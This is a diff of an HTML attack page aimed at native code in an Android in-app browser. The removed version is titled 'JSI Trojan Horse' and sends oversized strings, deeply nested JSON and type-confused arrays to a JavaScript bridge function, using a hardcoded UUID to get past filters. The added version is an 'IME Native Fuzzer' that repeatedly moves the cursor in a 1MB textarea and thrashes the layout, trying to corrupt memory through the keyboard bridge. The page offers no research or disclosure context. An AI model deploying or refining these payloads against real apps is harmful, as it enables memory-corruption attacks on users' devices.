@@ -1,60 +1,38 @@
 <!DOCTYPE html>
 <html>
-<head><title>JSI Trojan Horse</title></head>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>IME Native Fuzzer</title>
+</head>
 <body style="background:#000; color:#f00; font-family:monospace;">
-    <h3>Injecting Trojan Payloads...</h3>
-    <div id="log"></div>
+    <h3>Attacking libhelium IME Bridge...</h3>
+    
+    <textarea id="pwnbox" style="width:100%; height:300px; font-size:20px;"></textarea>
 
     <script>
-        const logEl = document.getElementById('log');
-        function log(msg) { logEl.innerHTML += msg + "<br>"; }
+        const box = document.getElementById('pwnbox');
+        
+        // 1. Create a 1MB string. This is small enough to avoid the Java GC panic, 
+        // but huge for a native C++ text buffer.
+        const giantText = "A".repeat(500000) + " PWNED " + "B".repeat(500000);
+        box.value = giantText;
 
-        // The Weapons
-        const giantString = "A".repeat(65536); 
-        let deepJson = '{"data":';
-        for(let i=0; i<3000; i++) deepJson += '{"a":';
-        deepJson += '"pwn"';
-        for(let i=0; i<3000; i++) deepJson += '}';
-        deepJson += '}';
+        function triggerIME() {
+            // 2. Force the Android Keyboard to wake up and attach to the C++ WebContents
+            box.focus();
+            
+            // 3. Rapidly change the cursor position.
+            // This forces Blink to execute onSurroundingTextReceived via JNI constantly.
+            let pos = Math.floor(Math.random() * 900000);
+            box.setSelectionRange(pos, pos + 50);
 
-        // A valid UUID to bypass regex filters
-        const validUUID = "90dd8846-f47b-4312-8307-3681dc5bec88";
-
-        function sendTrojan() {
-            if (typeof window.__call_iabjs_unified_bridge !== 'function') {
-                log("Waiting for bridge...");
-                return;
-            }
-
-            log("[*] Firing structured payloads...");
-
-            // Trojan 1: Overflow the Action Router
-            // If C++ uses a fixed buffer to read the action name, this will crush it.
-            try { window.__call_iabjs_unified_bridge(giantString, validUUID, "{}"); } catch(e){}
-
-            // Trojan 2: Overflow the Payload Parser
-            // We use a known valid action "page_language" but give it a 64KB JSON string
-            try { 
-                let payload1 = JSON.stringify({ "message": giantString });
-                window.__call_iabjs_unified_bridge("page_language", validUUID, payload1); 
-            } catch(e){}
-
-            // Trojan 3: Stack-Buster JSON
-            // Feed the deeply nested JSON to the text_classification parser
-            try { 
-                let payload2 = JSON.stringify({ "message": deepJson });
-                window.__call_iabjs_unified_bridge("text_classification", validUUID, payload2); 
-            } catch(e){}
-
-            // Trojan 4: Type Confusion
-            // It expects a JSON object, we give it a massive Array
-            try {
-                window.__call_iabjs_unified_bridge("initializeCallbackHandler", validUUID, Array(5000).fill("A"));
-            } catch(e){}
+            // 4. Thrash the DOM. This forces the C++ engine to recalculate layout 
+            // while the keyboard is actively trying to read the memory pointer.
+            box.style.transform = `translateY(${Math.random() * 10}px)`;
         }
 
-        // Fire gently to ensure they are processed sequentially by the native thread
-        setInterval(sendTrojan, 400);
+        // Fire the IME extraction requests aggressively (every 20ms)
+        setInterval(triggerIME, 20);
 
     </script>
 </body>
